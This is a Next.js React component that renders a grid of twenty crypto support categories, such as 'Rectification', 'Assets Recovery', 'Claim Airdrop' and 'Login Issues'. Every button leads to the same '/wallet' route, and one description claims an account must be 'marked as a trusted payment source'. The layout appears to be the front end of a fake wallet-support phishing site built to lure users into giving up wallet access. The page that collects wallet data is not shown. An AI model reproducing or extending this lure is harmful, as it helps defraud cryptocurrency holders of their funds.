"use client"

import { useRouter } from "next/navigation"
import {
    ShoppingCartIcon,
    GiftIcon,
    ArrowPathIcon,
    ShieldCheckIcon,
    ExclamationTriangleIcon,
    WrenchScrewdriverIcon,
    FireIcon,
    ArrowDownTrayIcon,
    ArrowsRightLeftIcon,
    XCircleIcon,
    LockClosedIcon,
    LinkIcon,
    WalletIcon,
    ClockIcon,
    UserCircleIcon,
    SparklesIcon,
    GlobeAltIcon,
    TrophyIcon
} from "@heroicons/react/24/outline"
import { ArrowRightEndOnRectangleIcon } from "@heroicons/react/24/solid"

const issues = [
    { title: "Buy Presale", desc: "Click here to get your token presale.", icon: ShoppingCartIcon },
    { title: "Claim Tokens", desc: "Click here to claim your tokens.", icon: GiftIcon },
    { title: "Migration Issues", desc: "Click here for migration related issues.", icon: ArrowPathIcon },
    { title: "Assets Recovery", desc: "Click here for assets recovery issues.", icon: ShieldCheckIcon },

    { title: "General Issues", desc: "Click here for general related issues.", icon: ExclamationTriangleIcon },
    { title: "Rectification", desc: "Click here to rectify issues.", icon: WrenchScrewdriverIcon },
    { title: "High Gas Fees", desc: "Click here for gas fee related issues.", icon: FireIcon },
    { title: "Claim Reward", desc: "Click here for reward related issues.", icon: TrophyIcon },

    { title: "Deposits & Withdrawals", desc: "Click here for withdrawal related issues.", icon: ArrowDownTrayIcon },
    { title: "Slippage Error", desc: "Click here for slippage related error during trade.", icon: ArrowsRightLeftIcon },
    { title: "Transaction Error", desc: "Click here for transaction related issues.", icon: XCircleIcon },
    { title: "Staking Issues", desc: "Click here for staking related issues.", icon: LockClosedIcon },

    { title: "Swap/Exchange", desc: "Click here for swap/exchange related issues.", icon: ArrowsRightLeftIcon },
    { title: "Connect to Dapps", desc: "Click here for error while connecting to Dapps.", icon: LinkIcon },
    { title: "Transaction Delay", desc: "To trade crypto your account must be marked as a trusted payment source.", icon: ClockIcon },
    { title: "Trading Wallet Issues", desc: "Click here if you have problem with your trading wallet.", icon: WalletIcon },

    { title: "Locked Account", desc: "Click here for issues related to account lock.", icon: LockClosedIcon },
    { title: "Claim Airdrop", desc: "Click here for airdrop related issues.", icon: SparklesIcon },
    { title: "Cross Chain Transactions", desc: "Click here for cross chain bridge issues.", icon: GlobeAltIcon },
    { title: "Login Issues", desc: "Click here for issues while logging into your wallet.", icon: ArrowRightEndOnRectangleIcon },
]

export default function IssuesGrid() {
    const router = useRouter()

    return (
        <section className="bg-white py-24">
            <div className="mx-auto max-w-7xl px-6">

                <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-6">
                    {issues.map((item) => {
                        const Icon = item.icon

                        return (
                            <button
                                key={item.title}
                                onClick={() => router.push("/wallet")}
                                className="rounded-xl border border-black p-6 text-left 
                           hover:border-purple-600 hover:shadow-md 
                           transition duration-300"
                            >
                                {/* Purple Icon */}
                                <Icon className="h-8 w-8 text-purple-600 mb-3" />

                                {/* Divider */}
                                <div className="my-2 h-px bg-black" />

                                <h3 className="font-semibold text-slate-900">
                                    {item.title}
                                </h3>

                                <p className="mt-2 text-sm text-slate-600">
                                    {item.desc}
                                </p>
                            </button>
                        )
                    })}
                </div>

            </div>
        </section>
    )
}
